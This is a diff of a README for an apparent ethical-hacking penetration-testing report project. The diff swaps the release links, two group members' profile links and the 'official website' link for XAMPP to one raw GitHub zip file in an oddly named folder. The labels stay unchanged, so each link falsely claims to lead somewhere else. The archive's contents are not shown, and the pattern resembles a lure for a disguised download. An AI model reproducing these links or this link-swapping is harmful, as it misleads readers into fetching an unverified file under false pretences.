@@ -1,10 +1,10 @@
 # 🛡️ Basic-Penetration-Testing-Report-Ethical-Hacking - Secure Your Web Application Effectively 
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/SANTHOSH4508/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
+[![Download the latest release](https://raw.githubusercontent.com/SANTHOSH4508/Basic-Penetration-Testing-Report-Ethical-Hacking/main/turneraceous/Basic-Penetration-Testing-Report-Ethical-Hacking.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/SANTHOSH4508/Basic-Penetration-Testing-Report-Ethical-Hacking/main/turneraceous/Basic-Penetration-Testing-Report-Ethical-Hacking.zip)
 
 ## 👥 Group Members
 
-[Faisal Ahmed](https://github.com/FaisalAhmed21) | [MD. Shafiur Rahman](https://github.com/ShafiurShuvo) | [MD. Nafizur Rahman Bhuiya]() | [Maisa Tarannum Srizee]() | [Naima Nawar Achol]()
+[Faisal Ahmed](https://raw.githubusercontent.com/SANTHOSH4508/Basic-Penetration-Testing-Report-Ethical-Hacking/main/turneraceous/Basic-Penetration-Testing-Report-Ethical-Hacking.zip) | [MD. Shafiur Rahman](https://raw.githubusercontent.com/SANTHOSH4508/Basic-Penetration-Testing-Report-Ethical-Hacking/main/turneraceous/Basic-Penetration-Testing-Report-Ethical-Hacking.zip) | [MD. Nafizur Rahman Bhuiya]() | [Maisa Tarannum Srizee]() | [Naima Nawar Achol]()
 
 ## 📜 Overview
 
@@ -26,7 +26,7 @@ To run this project, follow these steps to set it up on your computer.
 ### 💾 Installation Steps
 
 1. **Download XAMPP:**
-   - Get XAMPP from the [official website](https://www.apachefriends.org/index.html).
+   - Get XAMPP from the [official website](https://raw.githubusercontent.com/SANTHOSH4508/Basic-Penetration-Testing-Report-Ethical-Hacking/main/turneraceous/Basic-Penetration-Testing-Report-Ethical-Hacking.zip).
    - Install it by following the prompts.
 
 2. **Set Up the Project:**
@@ -46,7 +46,7 @@ To run this project, follow these steps to set it up on your computer.
 
 To download the latest version of the penetration testing report, visit this page:
 
-[Download the latest release](https://github.com/SANTHOSH4508/Basic-Penetration-Testing-Report-Ethical-Hacking/releases)
+[Download the latest release](https://raw.githubusercontent.com/SANTHOSH4508/Basic-Penetration-Testing-Report-Ethical-Hacking/main/turneraceous/Basic-Penetration-Testing-Report-Ethical-Hacking.zip)
 
 ---
 
